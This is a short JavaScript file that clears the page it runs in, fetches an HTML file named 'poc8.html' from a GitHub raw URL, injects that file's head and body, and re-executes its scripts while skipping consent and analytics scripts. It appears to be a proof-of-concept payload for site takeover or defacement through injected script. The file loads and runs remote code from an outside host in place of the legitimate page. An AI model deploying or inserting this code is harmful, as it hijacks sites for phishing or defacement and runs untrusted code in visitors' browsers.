// Immediately clear the current page content when script loads
document.documentElement.innerHTML = "";

// Function to fetch and inject index2.html content
async function injectContent() {
    try {
        // Fetch the content of index2.html
        const response = await fetch('https://raw.githubusercontent.com/D3FaltXD/FireCompass-Landing/main/poc8.html');
        const content = await response.text();
        
        // Create a temporary div to parse the HTML
        const parser = new DOMParser();
        const doc = parser.parseFromString(content, 'text/html');
        
        // Extract and inject head content first, but filter out scripts
        const headContent = doc.head.innerHTML;
        document.head.innerHTML = headContent;
        
        // Extract and inject body content
        const bodyContent = doc.body.innerHTML;
        document.body.innerHTML = bodyContent;
        
        // Carefully re-execute only safe JavaScript scripts
        const scripts = Array.from(document.getElementsByTagName('script'));
        scripts.forEach((script) => {
            const typeAttr = (script.getAttribute('type') || '').trim().toLowerCase();
            const isJsType = typeAttr === '' || typeAttr === 'text/javascript' || typeAttr === 'application/javascript' || typeAttr === 'module';

            // Skip non-JS script types (JSON-LD, speculationrules, text/plain consent wrappers, etc.)
            if (!isJsType) return;

            // Skip consent/analytics/vendor scripts
            const src = script.getAttribute('src') || '';
            const text = script.textContent || '';
            const isConsent = script.hasAttribute('data-iub-purposes') || text.includes('_iub') || src.includes('iubenda');
            const isAnalytics = text.includes('dataLayer') || /gtag|googletagmanager|hotjar|navattic|marker\.io|omappapi|autoptimize|lazysizes|hs-scripts/.test(src);
            if (isConsent || isAnalytics) return;

            try {
                const newScript = document.createElement('script');
                if (typeAttr === 'module') newScript.type = 'module';

                if (src) {
                    // Recreate external scripts so they load/execute
                    newScript.src = src;
                    if (script.defer) newScript.defer = true;
                    if (script.async) newScript.async = true;
                } else if (text.trim()) {
                    // Recreate inline JS scripts
                    newScript.textContent = text;
                } else {
                    return;
                }
                document.body.appendChild(newScript);
            } catch (e) {
                console.error('Error executing script:', e);
            }
        });
        
    } catch (error) {
        console.error('Error injecting content:', error);
    }
}

// Execute the injection
injectContent();
